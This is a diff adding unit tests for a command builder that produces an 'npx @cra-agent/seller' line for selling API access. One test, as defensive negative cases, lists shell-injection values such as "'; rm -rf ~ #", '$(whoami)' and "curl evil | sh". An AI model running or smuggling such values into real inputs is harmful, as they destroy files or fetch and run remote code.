@@ -65,3 +65,24 @@ describe("the one command", () => {
     expect(oneCommand({ ...base, keyFile: "/opt/keys/a.key" }, base.keyFile).code).toContain("--key-file '/opt/keys/a.key'");
   });
 });
+
+describe("the command that starts selling", () => {
+  const sell = { target: "https://api.example.com/v1", payTo: "0x33b37c6d7a98b58da3Ccb3F36A4b578053d0Ea74", price: "0.002", name: "Milan weather", free: ["/health", "/docs"], network: "arc" as const, publicUrl: "https://pay.example.com" };
+
+  it("is read back by the real cra-agent-sell parser exactly as it was typed", async () => {
+    const { parseSellArgs } = await import("../../seller/src/sell-args.js");
+    const { sellCommand, sellProblems } = await import("../src/factory-config.js");
+    expect(sellProblems(sell)).toEqual([]);
+    const line = sellCommand(sell).code;
+    expect(line.startsWith("npx -y @cra-agent/seller ")).toBe(true);
+    const argv = [...line.slice("npx -y @cra-agent/seller ".length).matchAll(/'([^']*)'|(\S+)/g)].map((m) => m[1] ?? m[2]!);
+    expect(parseSellArgs(argv)).toMatchObject({ target: sell.target, payTo: sell.payTo, routes: [{ pattern: "/*", price: "$0.002" }], name: "Milan weather", free: ["/health", "/docs"], network: "arc", list: sell.publicUrl });
+  });
+
+  it("refuses anything that could break out of the quotes it is pasted in", async () => {
+    const { sellProblems } = await import("../src/factory-config.js");
+    for (const bad of [{ target: "https://a.com/'; rm -rf ~ #" }, { target: "https://a.com/$(whoami)" }, { name: "x'; curl evil | sh #" }, { name: "`id`" }, { free: ["/ok", "/a b"] }, { free: ["health"] }, { payTo: "0x123" }, { price: "free" }, { publicUrl: "http://pay.example.com" }]) {
+      expect(sellProblems({ ...sell, ...bad }).length, JSON.stringify(bad)).toBeGreaterThan(0);
+    }
+  });
+});
